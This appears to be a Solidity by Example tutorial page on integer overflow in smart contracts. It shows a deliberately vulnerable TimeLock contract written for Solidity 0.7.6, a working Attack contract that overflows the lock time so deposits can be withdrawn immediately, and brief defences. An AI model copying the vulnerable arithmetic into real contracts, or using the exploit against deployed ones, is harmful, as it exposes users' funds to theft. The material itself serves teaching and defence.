# Arithmetic Overflow and Underflow Vulnerability
From https://solidity-by-example.org/hacks/overflow/

Integer overflow/underflow in smart contracts is a critical vulnerability that occurs when arithmetic operations exceed the maximum or minimum limits of the data type. This is particularly dangerous in versions of Solidity < 0.8 because:

- Integers in Solidity have fixed sizes (uint8 = 8 bits, uint256 = 256 bits, etc.)
- When an operation causes the value to exceed the maximum (2^n - 1) or go below the minimum (0), it will wrap around without any error (versions >= 0.8 throw an error instead)
- This wrapping behavior can be exploited to bypass time locks, manipulate balances, or break other contract invariants

For example, in a uint8 (8 bits):
- Maximum value: 255 (2^8 - 1)
- If you add 1 to 255 → it overflows to 0
- If you subtract 1 from 0 → it underflows to 255

## Why is this dangerous?

In the example contract, the vulnerability allows an attacker to:
1. Deposit funds with a normal 1-week timelock
2. Exploit integer overflow to manipulate the lockTime
3. Withdraw funds immediately, bypassing the timelock entirely

The attack works by finding a value X that when added to the current lockTime T will cause an overflow back to 0:
```
X + T = 2^256 = 0 (due to overflow)
Therefore: X = 2^256 - T
```

## Example
### Vulnerable Code
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Exploit Code
```
contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```

## Preventative Techniques
Use SafeMath to will prevent arithmetic overflow and underflow

Solidity 0.8 defaults to throwing an error for overflow / underflow